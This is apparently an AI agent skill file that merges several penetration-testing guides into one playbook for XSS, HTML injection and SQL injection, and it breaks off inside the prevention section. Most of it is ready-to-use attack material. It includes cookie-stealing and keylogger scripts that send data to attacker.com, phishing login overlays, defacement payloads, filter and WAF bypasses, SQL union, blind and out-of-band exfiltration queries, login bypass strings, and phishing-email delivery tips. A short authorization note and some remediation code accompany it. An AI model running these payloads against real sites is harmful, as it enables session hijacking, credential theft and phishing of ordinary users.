---
name: web-vuln-testing
description: "This skill should be used when the user asks to \'test for XSS vulnerabilities\', \'perform cross-site scripting attacks\', \'identify HTML injection flaws\', \'exploit client-side injection..."
triggers:
  - # broken authentication testing
  - # cross-site scripting and html injection testing
  - # file path traversal testing
  - # html injection testing
  - # idor vulnerability testing
  - # sql injection testing
  - # top 100 web vulnerabilities reference
  - ## constraints and limitations
  - ## core workflow
  - ## quick reference
  - ## references
  - ## troubleshooting
  - **affected endpoints**: list of vulnerable api endpoints and parameters
  - **authorization**: written permission for security testing
  - **burp suite or proxy tool**: intercepting proxy for request manipulation
merged_from:
  - xss-html-injection
  - sql-injection-testing
  - html-injection-testing
  - file-path-traversal
  - idor-testing
  - top-web-vulnerabilities
  - broken-authentication
merged_at: 2026-04-18T17:20:40.218451
---

# web-vuln-testing

<!-- xss-html-injection -->
## Purpose

Execute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and validate input sanitization and output encoding mechanisms. This skill enables systematic detection and exploitation across stored, reflected, and DOM-based attack vectors.

## Inputs / Prerequisites

### Required Access
- Target web application URL with user input fields
- Burp Suite or browser developer tools for request analysis
- Access to create test accounts for stored XSS testing
- Browser with JavaScript console enabled

### Technical Requirements
- Understanding of JavaScript execution in browser context
- Knowledge of HTML DOM structure and manipulation
- Familiarity with HTTP request/response headers
- Understanding of cookie attributes and session management

### Legal Prerequisites
- Written authorization for security testing
- Defined scope including target domains and features
- Agreement on handling of any captured session data
- Incident response procedures established

## Outputs / Deliverables

- XSS/HTMLi vulnerability report with severity classifications
- Proof-of-concept payloads demonstrating impact
- Session hijacking demonstrations (controlled environment)
- Remediation recommendations with CSP configurations

## Core Workflow

### Phase 1: Vulnerability Detection

#### Identify Input Reflection Points
Locate areas where user input is reflected in responses:

```
# Common injection vectors
- Search boxes and query parameters
- User profile fields (name, bio, comments)
- URL fragments and hash values
- Error messages displaying user input
- Form fields with client-side validation only
- Hidden form fields and parameters
- HTTP headers (User-Agent, Referer)
```

#### Basic Detection Testing
Insert test strings to observe application behavior:

```html
<!-- Basic reflection test -->
<test123>

<!-- Script tag test -->
<script>alert('XSS')</script>

<!-- Event handler test -->
<img src=x onerror=alert('XSS')>

<!-- SVG-based test -->
<svg onload=alert('XSS')>

<!-- Body event test -->
<body onload=alert('XSS')>
```

Monitor for:
- Raw HTML reflection without encoding
- Partial encoding (some characters escaped)
- JavaScript execution in browser console
- DOM modifications visible in inspector

#### Determine XSS Type

**Stored XSS Indicators:**
- Input persists after page refresh
- Other users see injected content
- Content stored in database/filesystem

**Reflected XSS Indicators:**
- Input appears only in current response
- Requires victim to click crafted URL
- No persistence across sessions

**DOM-Based XSS Indicators:**
- Input processed by client-side JavaScript
- Server response doesn't contain payload
- Exploitation occurs entirely in browser

### Phase 2: Stored XSS Exploitation

#### Identify Storage Locations
Target areas with persistent user content:

```
- Comment sections and forums
- User profile fields (display name, bio, location)
- Product reviews and ratings
- Private messages and chat systems
- File upload metadata (filename, description)
- Configuration settings and preferences
```

#### Craft Persistent Payloads

```html
<!-- Cookie stealing payload -->
<script>
document.location='http://attacker.com/steal?c='+document.cookie
</script>

<!-- Keylogger injection -->
<script>
document.onkeypress=function(e){
  new Image().src='http://attacker.com/log?k='+e.key;
}
</script>

<!-- Session hijacking -->
<script>
fetch('http://attacker.com/capture',{
  method:'POST',
  body:JSON.stringify({cookies:document.cookie,url:location.href})
})
</script>

<!-- Phishing form injection -->
<div id="login">
<h2>Session Expired - Please Login</h2>
<form action="http://attacker.com/phish" method="POST">
Username: <input name="user"><br>
Password: <input type="password" name="pass"><br>
<input type="submit" value="Login">
</form>
</div>
```

### Phase 3: Reflected XSS Exploitation

#### Construct Malicious URLs
Build URLs containing XSS payloads:

```
# Basic reflected payload
https://target.com/search?q=<script>alert(document.domain)</script>

# URL-encoded payload
https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E

# Event handler in parameter
https://target.com/page?name="><img src=x onerror=alert(1)>

# Fragment-based (for DOM XSS)
https://target.com/page#<script>alert(1)</script>
```

#### Delivery Methods
Techniques for delivering reflected XSS to victims:

```
1. Phishing emails with crafted links
2. Social media message distribution
3. URL shorteners to obscure payload
4. QR codes encoding malicious URLs
5. Redirect chains through trusted domains
```

### Phase 4: DOM-Based XSS Exploitation

#### Identify Vulnerable Sinks
Locate JavaScript functions that process user input:

```javascript
// Dangerous sinks
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout()
setInterval()
Function()
location.href
location.assign()
location.replace()
```

#### Identify Sources
Locate where user-controlled data enters the application:

```javascript
// User-controllable sources
location.hash
location.search
location.href
document.URL
document.referrer
window.name
postMessage data
localStorage/sessionStorage
```

#### DOM XSS Payloads

```javascript
// Hash-based injection
https://target.com/page#<img src=x onerror=alert(1)>

// URL parameter injection (processed client-side)
https://target.com/page?default=<script>alert(1)</script>

// PostMessage exploitation
// On attacker page:
<iframe src="https://target.com/vulnerable"></iframe>
<script>
frames[0].postMessage('<img src=x onerror=alert(1)>','*');
</script>
```

### Phase 5: HTML Injection Techniques

#### Reflected HTML Injection
Modify page appearance without JavaScript:

```html
<!-- Content injection -->
<h1>SITE HACKED</h1>

<!-- Form hijacking -->
<form action="http://attacker.com/capture">
<input name="credentials" placeholder="Enter password">
<button>Submit</button>
</form>

<!-- CSS injection for data exfiltration -->
<style>
input[value^="a"]{background:url(http://attacker.com/a)}
input[value^="b"]{background:url(http://attacker.com/b)}
</style>

<!-- iframe injection -->
<iframe src="http://attacker.com/phishing" style="position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
```

#### Stored HTML Injection
Persistent content manipulation:

```html
<!-- Marquee disruption -->
<marquee>Important Security Notice: Your account is compromised!</marquee>

<!-- Style override -->
<style>body{background:red !important;}</style>

<!-- Hidden content with CSS -->
<div style="position:fixed;top:0;left:0;width:100%;background:white;z-index:9999;">
Fake login form or misleading content here
</div>
```

### Phase 6: Filter Bypass Techniques

#### Tag and Attribute Variations

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>

<!-- Alternative tags -->
<svg/onload=alert(1)>
<body/onload=alert(1)>
<marquee/onstart=alert(1)>
<details/open/ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Malformed tags -->
<img src=x onerror=alert(1)//
<img """><script>alert(1)</script>">
```

#### Encoding Bypass

```html
<!-- HTML entity encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Hex encoding -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

<!-- Unicode encoding -->
<script>\u0061lert(1)</script>

<!-- Mixed encoding -->
<img src=x onerror=\u0061\u006cert(1)>
```

#### JavaScript Obfuscation

```javascript
// String concatenation
<script>eval('al'+'ert(1)')</script>

// Template literals
<script>alert`1`</script>

// Constructor execution
<script>[].constructor.constructor('alert(1)')()</script>

// Base64 encoding
<script>eval(atob('YWxlcnQoMSk='))</script>

// Without parentheses
<script>alert`1`</script>
<script>throw/a]a]/.source+onerror=alert</script>
```

#### Whitespace and Comment Bypass

```html
<!-- Tab/newline insertion -->
<img src=x	onerror
=alert(1)>

<!-- JavaScript comments -->
<script>/**/alert(1)/**/</script>

<!-- HTML comments in attributes -->
<img src=x onerror="alert(1)"<!--comment-->
```

## Quick Reference

### XSS Detection Checklist
```
1. Insert <script>alert(1)</script> → Check execution
2. Insert <img src=x onerror=alert(1)> → Check event handler
3. Insert "><script>alert(1)</script> → Test attribute escape
4. Insert javascript:alert(1) → Test href/src attributes
5. Check URL hash handling → DOM XSS potential
```

### Common XSS Payloads

| Context | Payload |
|---------|---------|
| HTML body | `<script>alert(1)</script>` |
| HTML attribute | `"><script>alert(1)</script>` |
| JavaScript string | `';alert(1)//` |
| JavaScript template | `${alert(1)}` |
| URL attribute | `javascript:alert(1)` |
| CSS context | `</style><script>alert(1)</script>` |
| SVG context | `<svg onload=alert(1)>` |

### Cookie Theft Payload
```javascript
<script>
new Image().src='http://attacker.com/c='+btoa(document.cookie);
</script>
```

### Session Hijacking Template
```javascript
<script>
fetch('https://attacker.com/log',{
  method:'POST',
  mode:'no-cors',
  body:JSON.stringify({
    cookies:document.cookie,
    localStorage:JSON.stringify(localStorage),
    url:location.href
  })
});
</script>
```

## Constraints and Guardrails

### Operational Boundaries
- Never inject payloads that could damage production systems
- Limit cookie/session capture to demonstration purposes only
- Avoid payloads that could spread to unintended users (worm behavior)
- Do not exfiltrate real user data beyond scope requirements

### Technical Limitations
- Content Security Policy (CSP) may block inline scripts
- HttpOnly cookies prevent JavaScript access
- SameSite cookie attributes limit cross-origin attacks
- Modern frameworks often auto-escape outputs

### Legal and Ethical Requirements
- Written authorization required before testing
- Report critical XSS vulnerabilities immediately
- Handle captured credentials per data protection agreements
- Do not use discovered vulnerabilities for unauthorized access

## Examples

### Example 1: Stored XSS in Comment Section

**Scenario**: Blog comment feature vulnerable to stored XSS

**Detection**:
```
POST /api/comments
Content-Type: application/json

{"body": "<script>alert('XSS')</script>", "postId": 123}
```

**Observation**: Comment renders and script executes for all viewers

**Exploitation Payload**:
```html
<script>
var i = new Image();
i.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

**Result**: Every user viewing the comment has their session cookie sent to attacker's server.

### Example 2: Reflected XSS via Search Parameter

**Scenario**: Search results page reflects query without encoding

**Vulnerable URL**:
```
https://shop.example.com/search?q=test
```

**Detection Test**:
```
https://shop.example.com/search?q=<script>alert(document.domain)</script>
```

**Crafted Attack URL**:
```
https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch('https://attacker.com/log?c='+document.cookie)%22%3E
```

**Delivery**: URL sent via phishing email to target user.

### Example 3: DOM-Based XSS via Hash Fragment

**Scenario**: JavaScript reads URL hash and inserts into DOM

**Vulnerable Code**:
```javascript
document.getElementById('welcome').innerHTML = 'Hello, ' + location.hash.slice(1);
```

**Attack URL**:
```
https://app.example.com/dashboard#<img src=x onerror=alert(document.cookie)>
```

**Result**: Script executes entirely client-side; payload never touches server.

### Example 4: CSP Bypass via JSONP Endpoint

**Scenario**: Site has CSP but allows trusted CDN

**CSP Header**:
```
Content-Security-Policy: script-src 'self' https://cdn.trusted.com
```

**Bypass**: Find JSONP endpoint on trusted domain:
```html
<script src="https://cdn.trusted.com/api/jsonp?callback=alert"></script>
```

**Result**: CSP bypassed using allowed script source.

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Script not executing | Check CSP blocking; verify encoding; try event handlers (img, svg onerror); confirm JS enabled |
| Payload appears but doesn't execute | Break out of attribute context with `"` or `'`; check if inside comment; test different contexts |
| Cookies not accessible | Check HttpOnly flag; try localStorage/sessionStorage; use no-cors mode |
| CSP blocking payloads | Find JSONP on whitelisted domains; check for unsafe-inline; test base-uri bypass |
| WAF blocking requests | Use encoding variations; fragment payload; null bytes; case variations |

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.


<!-- MERGED INTO: web-vuln-testing on 2026-04-18 -->
<!-- Use `web-vuln-testing` instead. -->

---

<!-- sql-injection-testing -->
## Purpose

Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms. This skill enables systematic detection and exploitation of SQL injection vulnerabilities across in-band, blind, and out-of-band attack vectors to assess application security posture.

## Inputs / Prerequisites

### Required Access
- Target web application URL with injectable parameters
- Burp Suite or equivalent proxy tool for request manipulation
- SQLMap installation for automated exploitation
- Browser with developer tools enabled

### Technical Requirements
- Understanding of SQL query syntax (MySQL, MSSQL, PostgreSQL, Oracle)
- Knowledge of HTTP request/response cycle
- Familiarity with database schemas and structures
- Write permissions for testing reports

### Legal Prerequisites
- Written authorization for penetration testing
- Defined scope including target URLs and parameters
- Emergency contact procedures established
- Data handling agreements in place

## Outputs / Deliverables

### Primary Outputs
- SQL injection vulnerability report with severity ratings
- Extracted database schemas and table structures
- Authentication bypass proof-of-concept demonstrations
- Remediation recommendations with code examples

### Evidence Artifacts
- Screenshots of successful injections
- HTTP request/response logs
- Database dumps (sanitized)
- Payload documentation

## Core Workflow

### Phase 1: Detection and Reconnaissance

#### Identify Injectable Parameters
Locate user-controlled input fields that interact with database queries:

```
# Common injection points
- URL parameters: ?id=1, ?user=admin, ?category=books
- Form fields: username, password, search, comments
- Cookie values: session_id, user_preference
- HTTP headers: User-Agent, Referer, X-Forwarded-For
```

#### Test for Basic Vulnerability Indicators
Insert special characters to trigger error responses:

```sql
-- Single quote test
'

-- Double quote test
"

-- Comment sequences
--
#
/**/

-- Semicolon for query stacking
;

-- Parentheses
)
```

Monitor application responses for:
- Database error messages revealing query structure
- Unexpected application behavior changes
- HTTP 500 Internal Server errors
- Modified response content or length

#### Logic Testing Payloads
Verify boolean-based vulnerability presence:

```sql
-- True condition tests
page.asp?id=1 or 1=1
page.asp?id=1' or 1=1--
page.asp?id=1" or 1=1--

-- False condition tests  
page.asp?id=1 and 1=2
page.asp?id=1' and 1=2--
```

Compare responses between true and false conditions to confirm injection capability.

### Phase 2: Exploitation Techniques

#### UNION-Based Extraction
Combine attacker-controlled SELECT statements with original query:

```sql
-- Determine column count
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
-- Continue until error occurs

-- Find displayable columns
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--
UNION SELECT NULL,'a',NULL--

-- Extract data
UNION SELECT username,password,NULL FROM users--
UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

#### Error-Based Extraction
Force database errors that leak information:

```sql
-- MSSQL version extraction
1' AND 1=CONVERT(int,(SELECT @@version))--

-- MySQL extraction via XPATH
1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--

-- PostgreSQL cast errors
1' AND 1=CAST((SELECT version()) AS int)--
```

#### Blind Boolean-Based Extraction
Infer data through application behavior changes:

```sql
-- Character extraction
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--

-- Conditional responses
1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
```

#### Time-Based Blind Extraction
Use database sleep functions for confirmation:

```sql
-- MySQL
1' AND IF(1=1,SLEEP(5),0)--
1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--

-- MSSQL
1'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
1'; SELECT pg_sleep(5)--
```

#### Out-of-Band (OOB) Extraction
Exfiltrate data through external channels:

```sql
-- MSSQL DNS exfiltration
1; EXEC master..xp_dirtree '\\attacker-server.com\share'--

-- MySQL DNS exfiltration
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--

-- Oracle HTTP request
1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
```

### Phase 3: Authentication Bypass

#### Login Form Exploitation
Craft payloads to bypass credential verification:

```sql
-- Classic bypass
admin'--
admin'/*
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
') OR ('1'='1
') OR ('1'='1'--

-- Username enumeration
admin' AND '1'='1
admin' AND '1'='2
```

Query transformation example:
```sql
-- Original query
SELECT * FROM users WHERE username='input' AND password='input'

-- Injected (username: admin'--)
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- Password check bypassed via comment
```

### Phase 4: Filter Bypass Techniques

#### Character Encoding Bypass
When special characters are blocked:

```sql
-- URL encoding
%27 (single quote)
%22 (double quote)
%23 (hash)

-- Double URL encoding
%2527 (single quote)

-- Unicode alternatives
U+0027 (apostrophe)
U+02B9 (modifier letter prime)

-- Hexadecimal strings (MySQL)
SELECT * FROM users WHERE name=0x61646D696E  -- 'admin' in hex
```

#### Whitespace Bypass
Substitute blocked spaces:

```sql
-- Comment substitution
SELECT/**/username/**/FROM/**/users
SEL/**/ECT/**/username/**/FR/**/OM/**/users

-- Alternative whitespace
SELECT%09username%09FROM%09users  -- Tab character
SELECT%0Ausername%0AFROM%0Ausers  -- Newline
```

#### Keyword Bypass
Evade blacklisted SQL keywords:

```sql
-- Case variation
SeLeCt, sElEcT, SELECT

-- Inline comments
SEL/*bypass*/ECT
UN/*bypass*/ION

-- Double writing (if filter removes once)
SELSELECTECT → SELECT
UNUNIONION → UNION

-- Null byte injection
%00SELECT
SEL%00ECT
```

## Quick Reference

### Detection Test Sequence
```
1. Insert ' → Check for error
2. Insert " → Check for error
3. Try: OR 1=1-- → Check for behavior change
4. Try: AND 1=2-- → Check for behavior change
5. Try: ' WAITFOR DELAY '0:0:5'-- → Check for delay
```

### Database Fingerprinting
```sql
-- MySQL
SELECT @@version
SELECT version()

-- MSSQL
SELECT @@version
SELECT @@servername

-- PostgreSQL
SELECT version()

-- Oracle
SELECT banner FROM v$version
SELECT * FROM v$version
```

### Information Schema Queries
```sql
-- MySQL/MSSQL table enumeration
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- Column enumeration
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Oracle equivalent
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

### Common Payloads Quick List
| Purpose | Payload |
|---------|---------|
| Basic test | `'` or `"` |
| Boolean true | `OR 1=1--` |
| Boolean false | `AND 1=2--` |
| Comment (MySQL) | `#` or `-- ` |
| Comment (MSSQL) | `--` |
| UNION probe | `UNION SELECT NULL--` |
| Time delay | `AND SLEEP(5)--` |
| Auth bypass | `' OR '1'='1` |

## Constraints and Guardrails

### Operational Boundaries
- Never execute destructive queries (DROP, DELETE, TRUNCATE) without explicit authorization
- Limit data extraction to proof-of-concept quantities
- Avoid denial-of-service through resource-intensive queries
- Stop immediately upon detecting production database with real user data

### Technical Limitations
- WAF/IPS may block common payloads requiring evasion techniques
- Parameterized queries prevent standard injection
- Some blind injection requires extensive requests (rate limiting concerns)
- Second-order injection requires understanding of data flow

### Legal and Ethical Requirements
- Written scope agreement must exist before testing
- Document all extracted data and handle per data protection requirements
- Report critical vulnerabilities immediately through agreed channels
- Never access data beyond scope requirements

## Examples

### Example 1: E-commerce Product Page SQLi

**Scenario**: Testing product display page with ID parameter

**Initial Request**:
```
GET /product.php?id=5 HTTP/1.1
```

**Detection Test**:
```
GET /product.php?id=5' HTTP/1.1
Response: MySQL error - syntax error near ''' 
```

**Column Enumeration**:
```
GET /product.php?id=5 ORDER BY 4-- HTTP/1.1
Response: Normal
GET /product.php?id=5 ORDER BY 5-- HTTP/1.1
Response: Error (4 columns confirmed)
```

**Data Extraction**:
```
GET /product.php?id=-5 UNION SELECT 1,username,password,4 FROM admin_users-- HTTP/1.1
Response: Displays admin credentials
```

### Example 2: Blind Time-Based Extraction

**Scenario**: No visible output, testing for blind injection

**Confirm Vulnerability**:
```sql
id=5' AND SLEEP(5)-- 
-- Response delayed by 5 seconds (vulnerable confirmed)
```

**Extract Database Name Length**:
```sql
id=5' AND IF(LENGTH(database())=8,SLEEP(5),0)--
-- Delay confirms database name is 8 characters
```

**Extract Characters**:
```sql
id=5' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
-- Iterate through characters to extract: 'appstore'
```

### Example 3: Login Bypass

**Target**: Admin login form

**Standard Login Query**:
```sql
SELECT * FROM users WHERE username='[input]' AND password='[input]'
```

**Injection Payload**:
```
Username: administrator'--
Password: anything
```

**Resulting Query**:
```sql
SELECT * FROM users WHERE username='administrator'--' AND password='anything'
```

**Result**: Password check bypassed, authenticated as administrator.

## Troubleshooting

### No Error Messages Displayed
- Application uses generic error handling
- Switch to blind injection techniques (boolean or time-based)
- Monitor response length differences instead of content

### UNION Injection Fails
- Column count may be incorrect → Test with ORDER BY
- Data types may mismatch → Use NULL for all columns first
- Results may not display → Find injectable column positions

### WAF Blocking Requests
- Use encoding techniques (URL, hex, unicode)
- Insert inline comments within keywords
- Try alternative syntax for same operations
- Fragment payload across multiple parameters

### Payload Not Executing
- Verify correct comment syntax for database type
- Check if application uses parameterized queries
- Confirm input reaches SQL query (not filtered client-side)
- Test different injection points (headers, cookies)

### Time-Based Injection Inconsistent
- Network latency may cause false positives
- Use longer delays (10+ seconds) for clarity
- Run multiple tests to confirm pattern
- Consider server-side caching effects

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.


<!-- MERGED INTO: web-vuln-testing on 2026-04-18 -->
<!-- Use `web-vuln-testing` instead. -->

---

<!-- html-injection-testing -->
## Purpose

Identify and exploit HTML injection vulnerabilities that allow attackers to inject malicious HTML content into web applications. This vulnerability enables attackers to modify page appearance, create phishing pages, and steal user credentials through injected forms.

## Prerequisites

### Required Tools
- Web browser with developer tools
- Burp Suite or OWASP ZAP
- Tamper Data or similar proxy
- cURL for testing payloads

### Required Knowledge
- HTML fundamentals
- HTTP request/response structure
- Web application input handling
- Difference between HTML injection and XSS

## Outputs and Deliverables

1. **Vulnerability Report** - Identified injection points
2. **Exploitation Proof** - Demonstrated content manipulation
3. **Impact Assessment** - Potential phishing and defacement risks
4. **Remediation Guidance** - Input validation recommendations

## Core Workflow

### Phase 1: Understanding HTML Injection

HTML injection occurs when user input is reflected in web pages without proper sanitization:

```html
<!-- Vulnerable code example -->
<div>
    Welcome, <?php echo $_GET['name']; ?>
</div>

<!-- Attack input -->
?name=<h1>Injected Content</h1>

<!-- Rendered output -->
<div>
    Welcome, <h1>Injected Content</h1>
</div>
```

Key differences from XSS:
- HTML injection: Only HTML tags are rendered
- XSS: JavaScript code is executed
- HTML injection is often stepping stone to XSS

Attack goals:
- Modify website appearance (defacement)
- Create fake login forms (phishing)
- Inject malicious links
- Display misleading content

### Phase 2: Identifying Injection Points

Map application for potential injection surfaces:

```
1. Search bars and search results
2. Comment sections
3. User profile fields
4. Contact forms and feedback
5. Registration forms
6. URL parameters reflected on page
7. Error messages
8. Page titles and headers
9. Hidden form fields
10. Cookie values reflected on page
```

Common vulnerable parameters:
```
?name=
?user=
?search=
?query=
?message=
?title=
?content=
?redirect=
?url=
?page=
```

### Phase 3: Basic HTML Injection Testing

Test with simple HTML tags:

```html
<!-- Basic text formatting -->
<h1>Test Injection</h1>
<b>Bold Text</b>
<i>Italic Text</i>
<u>Underlined Text</u>
<font color="red">Red Text</font>

<!-- Structural elements -->
<div style="background:red;color:white;padding:10px">Injected DIV</div>
<p>Injected paragraph</p>
<br><br><br>Line breaks

<!-- Links -->
<a href="http://attacker.com">Click Here</a>
<a href="http://attacker.com">Legitimate Link</a>

<!-- Images -->
<img src="http://attacker.com/image.png">
<img src="x" onerror="alert(1)">  <!-- XSS attempt -->
```

Testing workflow:
```bash
# Test basic injection
curl "http://target.com/search?q=<h1>Test</h1>"

# Check if HTML renders in response
curl -s "http://target.com/search?q=<b>Bold</b>" | grep -i "bold"

# Test in URL-encoded form
curl "http://target.com/search?q=%3Ch1%3ETest%3C%2Fh1%3E"
```

### Phase 4: Types of HTML Injection

#### Stored HTML Injection

Payload persists in database:

```html
<!-- Profile bio injection -->
Name: John Doe
Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
     <h1>Site Under Maintenance</h1>
     <p>Please login at <a href="http://attacker.com/login">portal.company.com</a></p>
     </div>

<!-- Comment injection -->
Great article!
<form action="http://attacker.com/steal" method="POST">
    <input name="username" placeholder="Session expired. Enter username:">
    <input name="password" type="password" placeholder="Password:">
    <input type="submit" value="Login">
</form>
```

#### Reflected GET Injection

Payload in URL parameters:

```html
<!-- URL injection -->
http://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action="http://attacker.com/steal">

<!-- Search result injection -->
http://target.com/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee>
```

#### Reflected POST Injection

Payload in POST data:

```bash
# POST injection test
curl -X POST -d "comment=<div style='color:red'>Malicious Content</div>" \
     http://target.com/submit

# Form field injection
curl -X POST -d "name=<script>alert(1)</script>&email=test@test.com" \
     http://target.com/register
```

#### URL-Based Injection

Inject into displayed URLs:

```html
<!-- If URL is displayed on page -->
http://target.com/page/<h1>Injected</h1>

<!-- Path-based injection -->
http://target.com/users/<img src=x>/profile
```

### Phase 5: Phishing Attack Construction

Create convincing phishing forms:

```html
<!-- Fake login form overlay -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
            background:white;z-index:9999;padding:50px;">
    <h2>Session Expired</h2>
    <p>Your session has expired. Please log in again.</p>
    <form action="http://attacker.com/capture" method="POST">
        <label>Username:</label><br>
        <input type="text" name="username" style="width:200px;"><br><br>
        <label>Password:</label><br>
        <input type="password" name="password" style="width:200px;"><br><br>
        <input type="submit" value="Login">
    </form>
</div>

<!-- Hidden credential stealer -->
<style>
    input { background: url('http://attacker.com/log?data=') }
</style>
<form action="http://attacker.com/steal" method="POST">
    <input name="user" placeholder="Verify your username">
    <input name="pass" type="password" placeholder="Verify your password">
    <button>Verify</button>
</form>
```

URL-encoded phishing link:
```
http://target.com/page?msg=%3Cdiv%20style%3D%22position%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Awhite%3Bz-index%3A9999%3Bpadding%3A50px%3B%22%3E%3Ch2%3ESession%20Expired%3C%2Fh2%3E%3Cform%20action%3D%22http%3A%2F%2Fattacker.com%2Fcapture%22%3E%3Cinput%20name%3D%22user%22%20placeholder%3D%22Username%22%3E%3Cinput%20name%3D%22pass%22%20type%3D%22password%22%3E%3Cbutton%3ELogin%3C%2Fbutton%3E%3C%2Fform%3E%3C%2Fdiv%3E
```

### Phase 6: Defacement Payloads

Website appearance manipulation:

```html
<!-- Full page overlay -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
            background:#000;color:#0f0;z-index:9999;
            display:flex;justify-content:center;align-items:center;">
    <h1>HACKED BY SECURITY TESTER</h1>
</div>

<!-- Content replacement -->
<style>body{display:none}</style>
<body style="display:block !important">
    <h1>This site has been compromised</h1>
</body>

<!-- Image injection -->
<img src="http://attacker.com/defaced.jpg" 
     style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">

<!-- Marquee injection (visible movement) -->
<marquee behavior="alternate" style="font-size:50px;color:red;">
    SECURITY VULNERABILITY DETECTED
</marquee>
```

### Phase 7: Advanced Injection Techniques

#### CSS Injection

```html
<!-- Style injection -->
<style>
    body { background: url('http://attacker.com/track?cookie='+document.cookie) }
    .content { display: none }
    .fake-content { display: block }
</style>

<!-- Inline style injection -->
<div style="background:url('http://attacker.com/log')">Content</div>
```

#### Meta Tag Injection

```html
<!-- Redirect via meta refresh -->
<meta http-equiv="refresh" content="0;url=http://attacker.com/phish">

<!-- CSP bypass attempt -->
<meta http-equiv="Content-Security-Policy" content="default-src *">
```

#### Form Action Override

```html
<!-- Hijack existing form -->
<form action="http://attacker.com/steal">

<!-- If form already exists, add input -->
<input type="hidden" name="extra" value="data">
</form>
```

#### iframe Injection

```html
<!-- Embed external content -->
<iframe src="http://attacker.com/malicious" width="100%" height="500"></iframe>

<!-- Invisible tracking iframe -->
<iframe src="http://attacker.com/track" style="display:none"></iframe>
```

### Phase 8: Bypass Techniques

Evade basic filters:

```html
<!-- Case variations -->
<H1>Test</H1>
<ScRiPt>alert(1)</ScRiPt>

<!-- Encoding variations -->
&#60;h1&#62;Encoded&#60;/h1&#62;
%3Ch1%3EURL%20Encoded%3C%2Fh1%3E

<!-- Tag splitting -->
<h
1>Split Tag</h1>

<!-- Null bytes -->
<h1%00>Null Byte</h1>

<!-- Double encoding -->
%253Ch1%253EDouble%2520Encoded%253C%252Fh1%253E

<!-- Unicode encoding -->
\u003ch1\u003eUnicode\u003c/h1\u003e

<!-- Attribute-based -->
<div onmouseover="alert(1)">Hover me</div>
<img src=x onerror=alert(1)>
```

### Phase 9: Automated Testing

#### Using Burp Suite

```
1. Capture request with potential injection point
2. Send to Intruder
3. Mark parameter value as payload position
4. Load HTML injection wordlist
5. Start attack
6. Filter responses for rendered HTML
7. Manually verify successful injections
```

#### Using OWASP ZAP

```
1. Spider the target application
2. Active Scan with HTML injection rules
3. Review Alerts for injection findings
4. Validate findings manually
```

#### Custom Fuzzing Script

```python
#!/usr/bin/env python3
import requests
import urllib.parse

target = "http://target.com/search"
param = "q"

payloads = [
    "<h1>Test</h1>",
    "<b>Bold</b>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<a href='http://evil.com'>Click</a>",
    "<div style='color:red'>Styled</div>",
    "<marquee>Moving</marquee>",
    "<iframe src='http://evil.com'></iframe>",
]

for payload in payloads:
    encoded = urllib.parse.quote(payload)
    url = f"{target}?{param}={encoded}"
    
    try:
        response = requests.get(url, timeout=5)
        if payload.lower() in response.text.lower():
            print(f"[+] Possible injection: {payload}")
        elif "<h1>" in response.text or "<b>" in response.text:
            print(f"[?] Partial reflection: {payload}")
    except Exception as e:
        print(f"[-] Error: {e}")
```

### Phase 10: Prevention and Remediation

Secure coding practices:

```php
// PHP: Escape output
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// PHP: Strip tags
echo strip_tags($user_input);

// PHP: Allow specific tags only
echo strip_tags($user_input, '<p><b><i>');
```

```python
# Python: HTML escape
from html import escape
safe_output = escape(user_input)

# Python Flask: Auto-escaping
{{ user_input }}  # Jinja2 escapes by default
{{ user_input | safe }}  # Marks as safe (dangerous!)
```

```javascript
// JavaScript: Text content (safe)
element.textContent = userInput;

// JavaScript: innerHTML (dangerous!)
element.innerHTML = userInput;  // Vulnerable!

// JavaScript: Sanitize
const clean = DOMPurify.sanitize(userInput);
